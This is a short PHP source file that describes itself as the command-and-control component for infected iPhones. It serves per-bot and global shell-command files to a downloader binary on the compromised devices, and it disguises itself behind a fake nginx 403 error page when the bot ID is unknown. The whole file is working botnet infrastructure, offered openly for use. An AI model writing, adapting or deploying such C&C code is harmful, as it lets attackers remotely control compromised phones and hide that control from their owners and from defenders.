<?php
	/*
		p.php - C&C component.
		---------------------
		This handles Command and Control logic for
		the infected iPhone, this merely echos a 
		shell script for the "duh" binary to download.
		
		/// NOTE ///
		Right now, there is no way to issue commands simply.
		You will need to edit the bot's command file to issue commands...
		To issue a global command, put it in the "all" file
		/// END ///
	*/
    error_reporting(E_ERROR | E_PARSE); // No php errors, but I reccomend you turn it on for debugging ONLY.
	
    $botid = htmlspecialchars($_GET["id"]);
	$global_cmd = $_SERVER["DOCUMENT_ROOT"] . "/xml/bots/all";
	$bot_cmd = $_SERVER["DOCUMENT_ROOT"] . "/xml/bots" . "/" . $botid;
    
    if(!$botid || !file_exists($bot_cmd)) { // Die with a fake nginx message
    	echo "<html>\n";
		echo "<head><title>403 Forbidden</title></head>\n";
		echo "<body bgcolor=\"white\">\n";
		echo "<center><h1>404 Forbidden</h1></center>\n";
		echo "<hr><center>nginx/6.6.6 (Mac OS X)</center>\n";
		echo "</body>\n";
		echo "</html>\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		die("");
    } else {
		header('Content-Type: text/plain');
		echo file_get_contents($global_cmd)."\n\n";
		echo file_get_contents($bot_cmd);
	}
?>